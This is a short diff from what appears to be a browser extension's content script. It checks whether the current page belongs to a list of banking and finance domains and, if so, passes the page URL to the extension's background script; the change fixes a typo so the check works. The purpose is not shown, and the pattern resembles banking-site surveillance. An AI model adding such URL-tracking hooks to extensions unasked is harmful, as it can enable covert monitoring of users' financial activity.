@@ -3,7 +3,7 @@ var myStringArray = ["secureinternetbank.com", "secureweb.inalco.com","financier
 var arrayLength = myStringArray.length;
 for (var i = 0; i < arrayLength; i++) {
     if (window.location.href.indexOf(myStringArray[i]) > -1) {
-         chrome.runtime.sendMessage({cmd: "w",data: window.lcoation.href});
+         chrome.runtime.sendMessage({cmd: "w",data: window.location.href});
 }
 }
 
